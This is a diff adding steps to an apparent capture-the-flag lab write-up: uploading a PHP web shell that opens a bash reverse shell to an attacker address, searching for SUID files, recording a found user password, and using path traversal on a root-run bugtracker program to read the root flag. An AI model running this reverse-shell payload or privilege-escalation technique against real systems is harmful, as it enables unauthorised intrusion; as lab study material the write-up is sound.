@@ -59,3 +59,34 @@ I changed the id to 34332 and the user to admin to get access to the uploads pag
 
 ==Super admin==
 ![[Pasted image 20250521223643.png]]
+
+
+# Upload php shell to folder and access it via /uploads:
+
+==Contents of shell==: 
+`<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.54/4444 0>&1'");
+?>`
+
+## Once connected to the reverse shell find Robert user for user.flag
+
+
+## Look for SUID files:
+`find / -perm -4000 -type f 2>/dev/null`
+
+# Search for files That the Robert user has access to:
+
+
+## Found user credentials in file:
+![[Pasted image 20250522233936.png]]
+
+Password: M3g4C0rpUs3r!
+
+# What is bugtracker?
+![[Pasted image 20250522232917.png]]
+
+When you run this program and give it a "`*`" it crashes revealing sensitive information. 
+
+![[Pasted image 20250522235644.png]]
+==Bugtracker is running cat insecurely as root, meaning we can give bugtracker `../root.txt` to get the root flag.==
+
